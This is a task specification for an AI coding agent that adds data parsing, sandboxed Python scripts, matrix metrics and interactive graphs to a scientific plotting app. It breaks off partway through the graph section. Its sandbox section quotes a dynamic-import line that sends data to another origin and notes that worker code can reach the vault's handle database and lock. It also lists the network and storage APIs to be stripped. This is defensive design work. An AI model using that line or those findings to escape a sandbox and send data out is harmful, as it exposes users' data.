# Task: Feature batch 3 — any data in, custom Python functions, interactive graphs and better exports

PMF Sequences is a Vite + React + TypeScript app that keeps each project in a user-owned folder (the **vault**). The vault, batch 1 and batch 2 are documented in `app/README.md`, `app/docs/storage-redesign.md`, `app/docs/storage-decisions.md` (D1–D46), `app/docs/feature-decisions.md` (F1–F80) and the batch reports. Read them all before anything else.

This batch makes the app **general purpose**. It must load any `xvg` or simple `x y` data and show it properly, recognise known kinds of data, and compute matrix values with built-in or uploaded Python functions. It also makes graphs interactive and exports flexible. Several requests come from a colleague, with example files (section 3).

| # | Request | Kind | Section |
|---|---|---|---|
| R1 | Any `xvg` or simple `x y` file loads and shows properly; known kinds are recognised; nothing unknown silently becomes a PMF | data | 6 |
| R2 | The PMF entropy correction becomes a setting: on, off, or a custom transform | data | 7 |
| R3 | Custom Python scripts: matrix functions `f(x, y, …) → number` and transforms of the graphed data | feature | 8 |
| R4 | The matrix from any analysis and any function, built-in or custom | feature | 9 |
| R5 | Interactive graphs: value on hover, marks by click, dashed reference lines by Ctrl+click | feature | 10 |
| R6 | Choose each curve's line style from the existing dash patterns | feature | 11 |
| R7 | Change an analysis's type after upload (including PMF ↔ analysis) | fix | 12 |
| R8 | Exports: an Export settings section, the E key, batch export of picked graphs, a legend with marks and matrix values | feature | 13 |

Take your time with each request. A small, correct, tested change is worth more than a fast one. When you are unsure, ask (section 0.5).

Where this spec says **verified**, the behaviour was checked by running the app's code at the baseline, on the example files. Confirm it anyway; if the code has changed, say so.

---

## 0. How to work on this task

### 0.1 Repository

- The git root holds `app/` (this codebase) next to `README.md`, `chats/` and `project/` from the original design handoff, and possibly Cypher's folder.
  - Those are history or other tools: don't follow the root `README.md`'s instructions, and don't change them.
- **Every path and every `npm` command in this spec is relative to `app/`.**
- Work on a new branch, `feature-batch-3`, from the commit that holds the finished batch 2. Record its hash in the Phase 0 report as the baseline.
- Baseline when this spec was written:
  - `npm run lint`: 0 errors, 7 warnings (`react(only-export-components)`);
  - `npm run build`: passes, with 1 warning (direct `eval` inside 3Dmol);
  - `npm test`: 390 tests pass in 20 files. Tests run in Node (no DOM, no WebGL).
  - The vault is schema 3 and dataset exports are v6.

### 0.2 Living documents

- Save this spec as `docs/feature-batch-3.md`.
- Add a **Feature batch 3** section to `docs/roadmap.md` with the checklist in section 4. Keep the existing backlog there.
- Continue `docs/feature-decisions.md` from **F81**, each decision with a one-line rationale.
- Save the Phase 0 report as `docs/feature-batch-3-phase0.md`.
- Finish with `docs/feature-batch-3-report.md` (section 18).

### 0.3 Phase 0: Investigate and plan (no code changes)

Scratch scripts and throwaway tests are fine, but keep them outside the repository or delete them. Only the Phase 0 documents are committed.

1. **Baseline.** Run lint, build and tests, and record the results. If anything fails, or the numbers differ from section 0.1, stop and tell me.
2. **The example files.** My colleague's files (section 3) are research data. **Ask me before committing them.** Recommendation: commit them under `test/fixtures/examples/`, as they are, with a short README naming their source.
   - The GROMACS headers name my colleague's cluster home folder and user name (`Working dir:`); mention that when you ask.
   - The archive also holds macOS metadata (`__MACOSX/`, `._*.xvg`): never commit it.
3. **For each request R1–R8**, write:
   - **Current behaviour.** With file and function references, verified by reading and, where practical, by running the code on the example files. If this spec is wrong about the code, say so.
   - **Proposed change.** The smallest change that meets the requirements. Name every file you will touch.
   - **Code budget.** Estimated lines added and removed.
   - **On-disk impact.** Does it change records, settings, manifest, cache or the export format?
   - **Tests.** By name.
   - **Risks.** Including interactions with the other requests.
   - **Open questions.** Each with options and your recommendation.
4. **One on-disk plan.** Several requests store new things: scripts, matrix definitions, marks, reference lines, line styles, type changes, type definitions and the correction setting. Design every new field and folder **together**, and propose **one** schema step (3 → 4) and **one** export version (v7) for the whole batch, unless you show that two are simpler. Additive settings keys follow the F30 precedent only when an older app is proven to keep them.
   - Schema 4 and export v7 aren't released until this batch is merged. Until then, a later phase that needs another field **amends** the one step, its migration and its tests, rather than adding a step 5. Record each amendment as a decision.
5. **Show me before building.** Send screenshots (static mock-ups in the app's own style are fine) of:
   - the upload plan for the example files;
   - the display styles (line, step, points, bars);
   - the correction setting;
   - the script manager with a trust prompt;
   - the matrix metric picker with its colour-scale choice;
   - a graph with hover readout, marks and reference lines;
   - the line-style control;
   - the change-type dialog;
   - the Export settings section;
   - a batch export.
6. **Order.** Confirm the roadmap in section 4, or propose a better one with reasons.
7. Put all open questions into **one numbered list** at the end of the Phase 0 report.

**Then STOP and wait for my answers.** Do not start Phase 1 until I reply.

### 0.4 Phases 1–7: one roadmap item at a time

For each item, in roadmap order:

1. Re-read its section and the approved plan. If anything has changed since Phase 0, stop and ask.
2. **Write the tests first.** Run them and see them fail for the right reason.
3. Make the smallest change that makes them pass.
4. **Review your own diff.** Simplify it, delete anything that became dead, match the surrounding naming and style, and remove debug output.
5. Run lint, build and tests. All pass, with no new warnings.
6. Run the item's manual checks in Chrome (`npm run dev`), and watch the console. Take a screenshot of every visual check.
   - Headless Chromium draws WebGL with `--use-gl=angle --use-angle=swiftshader --enable-unsafe-swiftshader`.
   - If a check needs something you can't do (a real user gesture, a real GPU, a file picker), mark it **not run** and list it for me. Never report a manual check as passed unless you ran it.
7. Update `docs/roadmap.md` and `docs/feature-decisions.md`.
8. Commit (section 17).
9. Give me a short summary (3–5 lines): what changed, net lines added or removed, tests added, manual checks run or not run (with screenshots), and anything you want me to look at.

**At the end of each phase, stop and wait for my go-ahead** before starting the next one.

### 0.5 When to stop and ask

Ask instead of guessing when:
- a request is ambiguous, or has more than one reasonable behaviour or look;
- a change would alter the vault's on-disk format or the export format beyond the agreed plan;
- anything could delete, overwrite, merge, hide or **re-type** user data;
- a computed number could change for existing data (the matrix, wells, areas); show me before and after;
- uploaded code would get any capability beyond computing on the numbers it is given;
- the code contradicts this spec or the approved plan;
- an item would exceed its code budget by more than about 50 %;
- you want a dependency (Pyodide is proposed in R3, but still needs my yes);
- a parser or test needs a file format you haven't seen in a real file.

Batch your questions where you can, and give each one options and a recommendation. Don't ask about things the code, the docs or this spec already settle.

---

## 1. Principles

### 1.1 Minimal, concise code

- Make the smallest correct change. Extend an existing function before adding a new one. Add a new module or abstraction only when at least two places use it.
- **Follow the existing architecture:**
  - data edits are pure `Store → Store` transforms in `src/lib/seq.ts`;
  - persistence goes through `ProjectService`, and components never know where files live;
  - every name → path rule stays in `storage/path.ts`;
  - derived data lives in `.matrix/cache/`;
  - plot geometry comes from `buildPlotMulti` and is drawn by `Plot.tsx` (screen) and `export.ts` (files).
- **Generality comes from data, not branches.**
  - A kind of data is an **analysis type definition** (the existing `AnalysisType`, extended): how to recognise it, how to show it, which transform and matrix function it uses by default.
  - New kinds need no new code.
  - PMF stays the built-in first type. Don't rewrite the run/analysis model unless Phase 0 shows it is the smaller change, and I agree.
- **Every decision lives in a pure function with tests:** parsing, recognition, transforms, matrix functions, colour scales, snapping, the export layout. Components only call them.
- **No new runtime dependencies** without my approval.
- Delete code that becomes unused. No commented-out code, and no `TODO` without a roadmap entry.
- Match the surrounding style. Don't reformat unrelated code. Don't restyle the app.
  - New UI follows the app's existing look, which my design system Morpheus documents (<https://claude.ai/artifact/RFhVLdZ9iBn1TJ9n3ybC3w>, `project/README.md`): lowercase controls, states as words, the chart rules for markers, dims and dashes.
- Report net lines added or removed for every item.

### 1.2 Web development practice

- Use semantic elements. Everything is reachable by keyboard, with a visible focus.
- **Every mouse gesture has a keyboard or menu equivalent.** This covers marks, reference lines, hover values and E-picking.
- **macOS:** Ctrl+click opens the context menu there, so use ⌘+click on macOS. Detect the platform and show the right key everywhere.
- **New keys:**
  - they are configurable like the compare and laser keys (`compareKey`, `laserKey`, `sameKey`);
  - they never fire while typing;
  - they don't clash with C (compare), K (laser), the arrow keys and Esc.
- **Announcements and contrast:** status, counts and readouts are announced (`aria-live="polite"`); text contrast is at least 4.5:1, and curves, marks and lines at least 3:1, in both themes and exports.
- **Large data stays responsive:** a 25,001-row, three-column file (`temperature.xvg`) draws, hovers and exports without freezing the page. Phase 0 proposes a target (for example, no main-thread task over 100 ms in Chrome's Performance panel), measures today's numbers, and each item reports against it.
- No new console errors or warnings. The layout works at 1024 px wide.

### 1.3 Data practice

- **Originals never change.** Transforms, functions, smoothing, decimation and display choices never modify stored data. Everything they produce is derived, cached by source SHA-256 and the exact inputs, and recomputed when any input changes.
- **Every computed number says how it was made:**
  - the data (file, curve, runs);
  - the transform (built-in correction, none, or a script with its SHA-256 and parameters);
  - the function (built-in or script, with parameters);
  - the Python version, for scripts.

  This appears in the tile's tooltip, the graph, the run's details and exports.
- **Never compute on what is only drawn.** Decimation for display, and smoothing unless the user chose it for the value, never feed a computed number. If a value is computed on smoothed data, it says so.
- **Missing values are explicit.**
  - Non-finite points (`nan`) are either dropped before a function or passed through, as decided in Phase 0. The count dropped is shown ("12 of 86 points have no value").
  - A function's error is shown in its tile and tooltip ("x must contain values on both sides of 0"), never as an empty tile or a zero.
- **Uncertainty is shown when it exists.**
  - A matrix value over several runs shows its spread (n, SD).
  - A mean of a time series shows an error estimate that accounts for correlation (block averaging), or says it has none.

  For example, `pressure.xvg` has a mean of 2.30 bar and an SD of 169 bar.
- **Units travel with every number:** axis labels, function results (declared when a function is registered), tiles, legends and exports.
- **The colour scale fits the metric.** Today's heat scale measures magnitude from zero, which only suits signed energies. A temperature of 310 K or an order parameter of 0.29 needs a min–max scale, and differences need a diverging one. The scale is chosen per metric, and shown with units in the legend and exports.
- **Recognition is evidence, never a guess presented as fact.**
  - Every type assignment says where it came from (header, file name, form, content).
  - **An unknown file never silently becomes a PMF**: it becomes generic data, or I choose.
- **Determinism.** The same data, script and parameters give the same number, the same file names and the same exports.

### 1.4 Running uploaded code safely (R3)

- Uploaded Python runs **only in a Web Worker**, through Pyodide. It has no DOM, no vault handles, no storage of the app and no network.
- **Verified** in Chromium, with Pyodide 314.0.7 in a module worker:
  - From Python, `import js` reaches `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `indexedDB`, `caches`, `Worker`, `BroadcastChannel`, `navigator.locks`, `navigator.storage` and `eval`.
  - This matters here: the app keeps the vault folder handles in IndexedDB (`pmf-vault-handles`), and holds the vault's single-writer lock with `navigator.locks` (`pmf-vault:<vaultId>`). Code in a same-origin worker can open that database and request that lock.
  - **`delete self.fetch` is not enough.** In a worker, `fetch`, `indexedDB` and `caches` live on the global's prototype chain, so deleting the global's own property leaves them working. Removing each name along the whole prototype chain, then pinning it to `undefined`, does remove them (tested), and the same applies to `navigator.locks` and `navigator.storage`.
  - **A deny-list alone still leaks.** After every global above was removed, `js.eval("import('http://another-origin/…?data=…')")` reached another origin. A dynamic `import()` is governed by the CSP's `script-src`, not `connect-src`.
  - **Where the CSP comes from matters.** A `<meta>` CSP on the page doesn't apply to a worker loaded from its own URL (the import above still leaked). A worker created from a `blob:` URL inherits the page's policy (the import was blocked).
  - Pyodide loads and runs under `script-src 'self' 'wasm-unsafe-eval'`, without `'unsafe-eval'`; under that policy `js.eval` is refused.
- **So the sandbox has two layers, both required:**
  1. Before any user code runs, remove `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `importScripts`, `indexedDB`, `caches`, `Worker`, `BroadcastChannel`, `navigator.locks` and `navigator.storage` along the prototype chain.
  2. A CSP that actually reaches the worker, with `script-src` and `connect-src` limited to the app itself.
  - Phase 0 shows the CSP works with the rest of the app: Crossref lookups (`api.crossref.org`), the fonts from Google Fonts and jsDelivr, 3Dmol (whose code contains a direct `eval`), and the Vite dev server (its inline refresh preamble and HMR websocket). The app is a static site hosted anywhere, so it can't rely on response headers.
  - An alternative for Phase 0 to weigh: run the worker inside a sandboxed `<iframe>` (an opaque origin with its own CSP), which shares no IndexedDB or locks with the app. Check that it can load the self-hosted Pyodide files.
- **Every call has a timeout,** and the worker is terminated if it is exceeded. The app stays usable while scripts run.
- **Trust is explicit, per script content.**
  - Before a new or changed script runs for the first time, the app shows its source and SHA-256 and asks me to trust it.
  - Trust is recorded per SHA-256 **in this browser**, like the vault handles, and never in the vault: a vault can't vouch for its own scripts. A script that arrives through an import or a copied vault asks again.
- **Scripts only compute.** They receive numbers and parameters and return numbers. Results are validated: type, length, finite values. Anything else is an error shown to me.
- **Pyodide is served from the app's own files,** pinned to one version, never from a CDN. It loads only when a script is first used.

---

## 2. Scope limits

- Don't change the PMF maths itself (`pmf.ts`) or what existing data computes to, unless R2's setting is changed by me. With default settings, every existing matrix value, well and area stays identical (golden tests).
- No undo/redo.
- No editing of stored data values by hand.
- Don't fix backlog items unless a request touches the same lines. In that case, say so and ask. Bugs you find along the way go into the backlog.
- All existing functionality keeps working. All existing tests keep passing. Change an existing test only with a recorded reason.

---

## 3. The example files

My colleague sent these, with this request (translated from Czech):

> The app should load any data in xvg or a simple 'x y' format and display it. If it recognises a specific type of result, it can do extra operations or show the data in a specific way, but the number of types can be unlimited. `functions.py` has a few simple Python functions. Each takes two sequences of floats (x and y values) and returns one number, which is then shown in the matrix (tile) view. The user uploads such a file, the app stores it, and from then on (in the same project) lets the user pick one of these functions alongside the built-in ones. All constants are defined inside the function. Fancy, but possibly hard: functions with extra arguments whose values the user supplies in the app.

And from me: custom scripts that change the graphed data (instead of the entropy correction); a setting to apply the correction or disable it completely for PMFs; and the app made as general purpose as possible.

**Verified** at the baseline, by running the app's parser and `detectAna` on each file, and `functions.py` in CPython and in Pyodide:

| File | What it is | What the app does today | What it should do (Phase 0 confirms) | Reference values |
|---|---|---|---|---|
| `translocation_free_energy.dat` | Free-energy profile across the membrane, x from −7.48 to +7.38 nm; `@ xlabel distance from the transmembrane state [nm]` / `@ ylabel free energy difference [kJ mol$^{-1}$]` | Filed as **Energy**, because "energy" is in the file name; axis labels lost | A free-energy profile with **no** entropy correction (x is a signed coordinate, not a radial distance, although its label says "distance"); labels and units from its `@` lines | `calc_barrier` = 121.377 kJ/mol |
| `membrane_thickness.dat` | Thickness against radial distance; 12 of 86 y values are `nan` | Filed as **PMF** (the fallback for unknown files); labels lost; the 12 `nan` rows dropped | Generic data, a line with gaps | `calc_mean` = `nan` as written, and so is `calc_barrier`; the mean of the 74 finite points is 3.83832 nm |
| `order_POPE.xvg` | Lipid order parameters: 32 carbons (x = 1–32) × 3 columns (full membrane, upper and lower leaflet); each data line is preceded by a `# Atom C22:` comment naming it | Filed as **PMF** (fallback); only the first column; the carbon names lost | **Discrete**: points or bars, no smoothing; the mean in the matrix tile | `calc_mean` = 0.292503 (full), 0.306884 (upper), 0.281922 (lower); `calc_peak_distance` raises "x must contain values on both sides of 0" |
| `phosphorus.xvg` | `gmx density` profile of phosphorus along z (`-center`) | **Unknown**: I pick a type | A density profile; membrane thickness as the distance between its two peaks | `calc_peak_distance` = 3.98748 nm (peaks at ±1.99374) |
| `temperature.xvg` | `gmx energy`, 25,001 rows, 3 terms | **Unknown**: the title "GROMACS Energies" doesn't contain the keyword "energy" | Energy (time series); the mean with an error estimate in the tile | Mean 310.0434 / 310.2416 / 309.7747 K and SD 1.357 / 1.520 / 1.811 K (Temperature, T-Membrane, T-W_ION) |
| `pressure.xvg` | `gmx energy`, 25,001 rows | **Unknown**, as above | As above | Mean 2.2994 bar, **SD 168.953 bar** |
| `functions.py` | `calc_mean`, `calc_barrier`, `calc_peak_distance`; standard library only (`statistics`); `ValueError` on bad input | — | Uploaded as matrix functions (R3, R4) | Errors such as "x must contain values on both sides of 0" are shown, not swallowed |

SDs are sample SDs (`statistics.stdev`). The reference values were recomputed with CPython from the files as sent.

**Verified side findings:**
- **The entropy correction distorts the translocation profile.** `correctCurve` adds +2kT·ln x only where x > 0, then sets the last 10 % of points to zero. On `translocation_free_energy.dat` the value at x ≈ −7.0 moves from −1.16 to −10.96 kJ/mol, the minimum from −36.80 to −46.07, and the maximum from 84.58 to 75.00. The correction assumes a radial distance. That is why R2 matters.
- **Today the matrix always uses the corrected curve** (`cellValue` → `curveStats` → `correctCurve`). The dialog's corrected/raw switch changes only the graph, for the session.
- **`nan` reaches Python silently.** `statistics.mean` returns `nan`, and Python's `max` and `min` give results that depend on where the `nan` sits. So `calc_barrier` on `membrane_thickness.dat` is `nan` too. The missing-value rule (section 1.3) must hold before any function is called.
- **Graph axis labels come from the type, never from the file** (`DetailDialog.tsx`: `T.xLabel` / `T.yLabel`, or the project's PMF labels). Even with R1's parser reading the labels, the translocation profile filed as Energy would read "Time (ps)" and "kJ/mol", and `temperature.xvg` (in K) would read "kJ/mol".
- **`cleanLabel` strips Grace markup**, so "Density (kg m\S-3\N)" becomes "Density (kg m-3)": the superscript is lost.

---

## 4. Roadmap

Add this to `docs/roadmap.md` and keep it current.

**Why this order:**
- getting data in correctly comes first, because everything else computes on it;
- the correction setting is the first transform, so it shapes how R3's transforms plug in;
- the frozen fixtures come first, because R1's type definitions and R2's setting may already be stored in settings;
- the on-disk step is made once, before the features that store things;
- the scripts come before the general matrix that uses them;
- marks and reference lines come before the exports that show them.

### Phase 0: Plan
- [ ] Branch created; baseline commit, lint, build and test results recorded
- [ ] Example files committed (if I agree)
- [ ] Phase 0 report for R1–R8, one on-disk plan, screenshots
- [ ] Questions answered; decisions F81… recorded; order confirmed

### Phase 1: Data in (R1, R2)
- [ ] F-0 Frozen schema-3 vault and v6 export fixtures (made with unchanged code, before R1 or R2 store anything)
- [ ] R1a Parser: `@ xlabel`/`@ ylabel`, `nan`, comment labels, LaTeX and Grace markup in labels, plain `x y` files; golden tests on every existing fixture
- [ ] R1b Recognition: header, name and content evidence in a stated order; no silent PMF; `gmx energy` and `gmx density` recognised; the file-name rule fixed
- [ ] R1c Display styles per type: line, step, points, bars; smoothing off by default for discrete types; display decimation for large files
- [ ] R2 Correction setting (on / off / transform), with the matrix and graphs following; golden tests for "on"

### Phase 2: On-disk foundation and quick wins (R6, R7)
- [ ] F-1 Schema 3 → 4 and export v7, as agreed in Phase 0 (fields only; features follow; amended later only as section 0.3 says)
- [ ] R6 Line style per curve and run
- [ ] R7 Change an analysis's type, with a preview of every consequence

### Phase 3: Custom scripts (R3)
- [ ] R3a Pyodide worker: self-hosted, lazy, sandboxed, timeouts (with my approval of the dependency)
- [ ] R3b Script files in the vault; discovery of functions, parameters and docs; trust per SHA-256
- [ ] R3c Matrix functions and transforms called through one validated interface; caching and provenance

### Phase 4: The general matrix (R4)
- [ ] R4a Metric definitions: type, curve, function, parameters, transform, aggregation over runs; Area and Min as built-ins with identical numbers
- [ ] R4b Colour scales per metric, with units; tiles with spread and errors; tooltips with provenance
- [ ] R4c The example files' tiles match section 3's reference values

### Phase 5: Interactive graphs (R5)
- [ ] R5a Hover readout (keyboard too)
- [ ] R5b Marks by click, snapped to data
- [ ] R5c Reference lines by Ctrl+click (vertical) and Ctrl+Shift+click (horizontal); ⌘ on macOS
- [ ] R5d Marks and lines stored, listed, removable, and drawn in Compare and exports

### Phase 6: Exports (R8)
- [ ] R8a Export settings section (format, size, scale, theme, fonts, title, legend, layout, naming, destination)
- [ ] R8b The E key in the graph dialog: export exactly as shown, in the default format
- [ ] R8c Hold E in the matrix: pick cells, release to export them with their view settings; Shift+E adds every analysis with the PMF
- [ ] R8d Legend of marked values and/or the current matrix value; multi-graph output (multi-page PDF, grid figure or folder)

### Phase 7: Finish
- [ ] README updated, with a guide for writing scripts
- [ ] Manual QA in Chrome with every example file; results recorded (passed, failed or not run)
- [ ] Fresh-context review of the whole batch diff against section 15 (a reviewer that didn't write the code); findings fixed or recorded
- [ ] Final report `docs/feature-batch-3-report.md`

---

## 5. Files you will mostly work in

| Area | Where |
|---|---|
| Parsing, recognition, types, matrix values, plot geometry | `src/lib/seq.ts` (`parseTable`, `cleanLabel`, `detectAna`, `DEFAULT_ANALYSES`, `getAnalyses`, `pickCurves`, `planBatch`, `cellValue`, `curveStats`, `maxMag`, `METRIC_META`, `buildPlotMulti`, `smoothY`) |
| PMF maths and colour | `src/lib/pmf.ts` (`correctCurve`, `CORRECTION`, `wellArea`, `runStats`, `norm`, `ramp`), `src/lib/shade.ts` |
| Types | `src/lib/types.ts` (`AnalysisType`, `Curve`, `Run`, `Extra`, `Settings`, `Metric`), `src/lib/storage/records.ts` (`CurveRec`, `curveDisplay`, `SCHEMA_VERSION`) |
| Persistence | `storage/project.ts`, `plan.ts`, `model.ts`, `files.ts`, `cache.ts`, `manifest.ts` (`MIGRATIONS`), `exchange.ts` (`EXPORT_VERSION`), `path.ts` (reserved folders `_sequences`, `_imports`, `_restored`), `index.ts` (`scanProject`) |
| UI | `App.tsx` (keys, matrix export, compare picking), `Matrix.tsx`, `DetailDialog.tsx`, `Plot.tsx`, `CompareDialog.tsx`, `SettingsDialog.tsx` (Data & axes, Analyses, Tags, Modify, Appearance, Laser pointer), `UploadDialog.tsx`, `ui.tsx` (`ExportMenu`, `ExportFormat`) |
| Exports | `src/lib/export.ts` (`graphScene`, `matrixScene`, `toSVG`, `toPNG`, `toPDF`, `graphXvg`, `matrixXvg`) |
| Tests | `test/` (Vitest in Node, `MemoryBackend`, helpers, real GROMACS files in `test/fixtures/gmx/`) |

---

## 6. R1: Any data in, shown properly

### Today (verified)

- **What `parseTable` reads.** It skips `#` lines and reads `@ title`, `@ xaxis label`, `@ yaxis label` and `@ sN legend`. The `.dat` flavour's `@ xlabel …` / `@ ylabel …` lines are ignored.
- **`nan`.** It parses as NaN. Analysis curves keep it as a gap; PMF runs drop the row.
- **Carbon names.** The `# Atom C22:` comments that name order-parameter positions are discarded.
- **Recognition (`detectAna`)** checks the header first, then keyword hits in the file name, then falls back:
  - a GROMACS file that matches nothing becomes **unknown**;
  - **any other file becomes PMF**;
  - a keyword found anywhere in the file name counts ("energy" in `translocation_free_energy.dat`).
- **Display styles:** `AnalysisType.style` is only `line` or `step`.
- **Axis labels** on graphs and exports come from the type (or the project's PMF labels), never from the file (section 3). `cleanLabel` strips Grace markup instead of rendering it.
- **Folder import** keeps every `.xvg`, `.dat` and `.txt` that isn't OS clutter (`isOsClutter` in `storage/path.ts`). macOS's `__MACOSX/` folders and `._*` files aren't on that list: on the unzipped example archive, `filesFromInput` offers 12 data files, the six real ones and six `__MACOSX/for_krystof/._*` metadata files.

### Requirements

1. **Formats.**
   - Read `xvg` (with every header form above, plus `@ xlabel`/`@ ylabel`), and plain whitespace- or comma-separated `x y1 y2 …` text, with `#` comments.
   - Keep `nan` as a missing value.
   - Turn Grace markup (`\S-3\N`) and simple LaTeX (`$^{-1}$`) in labels into readable text with superscripts, without inventing anything.
   - Units in brackets or parentheses are recognised as units.
   - **Ask** whether comment-named x positions (`# Atom C22:`) should label a categorical x axis.
   - `__MACOSX/` and `._*` files are skipped as OS clutter, with the other clutter.
2. **Labels.** Decide which label wins, and ask: the file's own label when it has one, else the type's (recommended), or always the type's, as today. Existing graphs and exports change if the file's label wins, so the golden export tests change with a recorded decision.
3. **Golden tests first.** Every existing fixture parses exactly as before.
4. **Recognition** uses evidence in a stated order: explicit choice → header (tool, title) → content (for example, integer x positions with discrete values) → file name as **whole words**.
   - It reports the source, as `anaHow` does today.
   - The word "distance" isn't evidence of a radial distance: the translocation profile's label says "distance", but its x runs from −7.48 to +7.38 nm.
   - `gmx energy` ("GROMACS Energies") and `gmx density` ("Partial density") are recognised.
   - **An unknown file becomes a generic "data" type, or asks me; it never becomes a PMF silently.** Ask which (recommendation: generic data, clearly labelled, one click to change, R7).
5. **Types stay data.** A type definition (the existing `AnalysisType`, extended) says:
   - how to recognise it;
   - its display style (line, step, points, bars);
   - whether it smooths by default;
   - its default transform (R2, R3) and matrix function (R4).

   I can add types in Settings → Analyses, as today. Phase 0 proposes the built-in types needed for the example files (a z-coordinate free-energy profile, a density profile, order parameters, energy terms, generic data).
6. **Discrete data** (order parameters) is drawn as points or bars, never smoothed by default, and never joined by a line unless I choose one.
7. **Large files** (25,001 rows × 3) are decimated for drawing only (for example min/max per pixel column), never for computing. Hover (R5) reads the full data.

### Tests

- **Parser, table-driven:** every example file; `@ xlabel` forms; `nan`; comma-separated; labels with Grace and LaTeX markup; every existing fixture unchanged.
- **Folder import:** the example archive as unzipped, `__MACOSX/` included, offers exactly the six data files.
- **Labels:** the agreed precedence on every example file.
- **Recognition:** every example file and every existing fixture → expected type and source.
- **Decimation:** what is drawn keeps every local extreme; nothing computed uses it.

### Manual checks

- Upload every example file, alone and together.
- The plan shows types and sources.
- Each is drawn as section 3 says.
- `temperature.xvg` stays responsive.
- Screenshots.

---

## 7. R2: The PMF correction as a setting

### Today (verified)

- The correction is fixed (+2kT·ln r, `f` = 2, last 10 % of points set to zero).
- The matrix always uses it.
- The dialog's corrected/raw switch is session-only and affects only the graph.
- It is wrong for z-coordinate profiles (section 3).

### Requirements

1. **A project setting** in Settings → Data & axes chooses the transform applied to PMF-like data: **entropy correction** (today's, the default), **none**, or a **custom transform** (R3).
   - Ask whether it is set per type (recommended: per type, so the z-profile type defaults to none) or once for the project.
2. **The graphs, the matrix, wells, areas, markers, Compare and exports all follow it.** The dialog switch, if kept, shows the setting rather than contradicting it. Ask whether to keep a temporary "show raw" view.
3. **Visible.** The current transform is named on every graph, tile tooltip and export ("corrected: +2kT·ln r, tail = 0" / "no correction" / "transform: shift_to_bulk (a1b2…)").
4. **Golden tests.** With the default, every existing value is identical.
5. **Before and after.** Changing the setting shows how many tiles change, before it is applied.

### Tests

- Each choice through `cellValue`, the wells and the exports.
- Golden values for the default.
- The translocation profile is unchanged with "none".

---

## 8. R3: Custom Python scripts

### Today

There are no scripts.

**Verified:** the `pyodide` npm package (314.0.7, Python 3.14.2, about 14 MB unpacked) runs `functions.py` unchanged in Node:
- it loads in about 2.5 s;
- `inspect.signature` lists all three functions with their parameters;
- `calc_peak_distance` on `phosphorus.xvg` gives 3.98748, exactly as CPython;
- a `ValueError` arrives with its message;
- `import js; js.fetch` is reachable, and in a browser worker much more is (section 1.4).

### Requirements

1. **Uploading.** I upload a `.py` file in Settings (a new **Functions** section, or as Phase 0 proposes).
   - It is stored **byte for byte in the vault**, in a reserved project folder (for example `_scripts/`), tracked in records so it never shows as untracked. Its SHA-256 is recorded.
   - Replacing it moves the old version to the trash; deleting it uses the trash.
   - Dataset exports carry scripts; importing them asks for trust again.
2. **Discovery.** The app lists the file's top-level functions, with their docstrings and parameters.
   - **Two roles,** decided by signature or by my choice (Phase 0 proposes the contract and asks me):
     - **Matrix function:** `f(x, y, …) → float`;
     - **Transform:** `g(x, y, …) → y` or `(x, y)`, used for R2.
   - **Extra parameters** (the "fancy" part) are those after `x, y`, with defaults and simple annotations (`float`, `int`, `bool`, `str`, `Literal[...]`). I set their values where the function is used, and they are stored with that use.
   - Each function gets a name, a unit (I enter it, or the docstring declares it) and a description.
3. **Calling.**
   - One validated interface for both roles: numbers in, numbers out, checked for type, length and finiteness.
   - The missing-value rule from section 1.3.
   - The timeout rule from section 1.4.
4. **Built-ins stay built in** (Area, Min, and the new ones from R4), in TypeScript, side by side with scripts in one picker.
5. **Caching and provenance.** Results are cached by data SHA-256, script SHA-256, function, parameters, transform and Python version. Any change recomputes. Every result shows where it came from (section 1.3).
6. **Allowed modules.** The standard library only, at first (`functions.py` uses `statistics`). Ask whether `numpy` should be offered, and at what download cost.

### Tests

- **Discovery** on `functions.py` (names, parameters, docs).
- **Calls** match CPython on every example file: the reference values of section 3, including the errors.
- **Parameters:** defaults and annotations; bad values refused.
- **Sandbox, in a real browser worker** (section 1.4), from Python through `import js`:
  - every name on the deny-list is unavailable, including through `js.eval` and the prototype chain;
  - the vault handle database and the vault lock can't be reached;
  - a dynamic `import()` to another origin is refused;
  - an infinite loop is stopped by the timeout.
- **Trust:** a changed byte asks again; a copied vault asks again.
- **Vault:** byte-identical after reopen; trash on replace; export v7 round trip; import asks for trust.

Pyodide runs in Node, so discovery, calls and parameters use the real runtime there. The sandbox can only be tested in a browser: Node has no browser worker and no CSP. Propose in Phase 0 how to run those checks (a small Playwright test, as Cypher already has, needs my approval as a dev dependency; otherwise a scripted headless check, recorded in the report).

---

## 9. R4: The matrix from any analysis and any function

### Today (verified)

- The matrix shows PMF runs only, with Area or Min, as the mean of the runs.
- Colour is `(|v| / max)^0.55`, magnitude from zero.

### Requirements

1. **A matrix metric is a definition:**
   - the analysis type (PMF or any other);
   - which curve (by legend or column, for example "Full membrane");
   - the transform (R2);
   - the function (built-in or script) with its parameters;
   - the aggregation over runs (the mean, with n and SD);
   - the unit;
   - the colour scale.

   Phase 0 proposes where metrics are stored, and whether pages keep their own (today the Area/Min choice is session-only, D38).
2. **Built-in functions.** Area and Min (identical numbers to today: golden tests), plus a small set: mean, max, max − min (barrier), value at x, and, for time series, a mean with a block-averaged error. Phase 0 proposes the list.
3. **The picker** in the header replaces the Area/Min toggle. Quick access to recent metrics.
4. **Tiles:**
   - the value with its unit, and the spread when there are several runs;
   - "—" with a reason (no data, function error, no such curve);
   - the tooltip shows the full provenance (section 1.3).
5. **The colour scale** is chosen per metric (from zero, min–max, diverging around a value), and the legend shows it with units (section 1.3).
6. **The example files** give section 3's reference values in their tiles, with the agreed missing-value rule for `membrane_thickness.dat`.

### Tests

- Golden Area and Min.
- Every built-in function, table-driven.
- Aggregation with spread.
- Scale mapping (from zero, min–max, diverging, all values equal, a single value).
- Tiles for the example files.
- A function error shown in its tile.

---

## 10. R5: Interactive graphs

### Today (verified)

- `Plot.tsx` has no pointer or keyboard handlers.
- The zero line is drawn dashed when zero is in range.
- Markers per type exist (batch 2).

### Requirements

1. **Hover.** A crosshair and a readout of x and y for each visible curve at the pointer, with units and the curve's name.
   - Values come from the full data (not the decimated drawing), at the nearest data point; interpolation only if Phase 0 agrees.
   - If smoothing is on, the readout says so, or shows both values (ask).
   - Keyboard: focus the plot, and the arrow keys step through the points.
2. **Marks.** A click on (or near) a curve adds a mark, snapped to the nearest data point of the nearest visible curve.
   - It is drawn as Morpheus's 4px dot in the curve's colour, labelled with its value.
